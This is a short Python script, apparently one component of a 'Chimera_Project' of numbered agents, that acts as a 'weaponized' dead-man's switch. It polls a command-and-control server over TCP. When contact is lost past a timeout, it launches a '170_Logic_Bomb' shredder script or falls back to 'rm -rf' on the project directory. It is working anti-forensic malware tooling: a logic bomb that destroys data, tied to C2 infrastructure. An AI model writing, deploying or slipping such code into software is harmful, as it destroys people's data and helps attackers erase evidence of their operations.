import os
import sys
import socket
import time
import subprocess

def initiate_purge():
    """Triggers the Agent 170 Shredder logic."""
    purge_script = "/home/dan/Chimera_Project/agents/170_Logic_Bomb/src/main.py"
    if os.path.exists(purge_script):
        # Trigger immediate self-destruct of the whole project root
        subprocess.run(["python3", purge_script, "deadline", "0"])
    else:
        # Fallback: Nuclear option if 170 is missing
        subprocess.run(["rm", "-rf", "/home/dan/Chimera_Project"])
    sys.exit(0)

def heartbeat_monitor(c2_ip, c2_port, timeout=300):
    """
    Weaponized Dead-Man's Switch: Purges local data if the 
    C2 heartbeat is lost for more than 'timeout' seconds.
    """
    print(f"[*] Heartbeat Linked to {c2_ip}:{c2_port}. Timeout: {timeout}s")
    last_contact = time.time()

    while True:
        try:
            # Attempt a low-chatter TCP ping to the Core
            with socket.create_connection((c2_ip, c2_port), timeout=5):
                last_contact = time.time()
                # print("[*] Heartbeat: ACK") 
        except (socket.timeout, ConnectionRefusedError):
            # C2 is unreachable
            elapsed = time.time() - last_contact
            if elapsed > timeout:
                print(f"[!!!] C2 LOST FOR {int(elapsed)}s. INITIATING PURGE.")
                initiate_purge()
            else:
                print(f"[*] Warning: C2 Unreachable. Purge in {int(timeout - elapsed)}s")
        
        time.sleep(30) # Check every 30 seconds

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 171_integration <c2_ip> <c2_port> [timeout_seconds]")
        sys.exit(1)
    
    t_out = int(sys.argv[3]) if len(sys.argv) > 3 else 300
    heartbeat_monitor(sys.argv[1], int(sys.argv[2]), t_out)
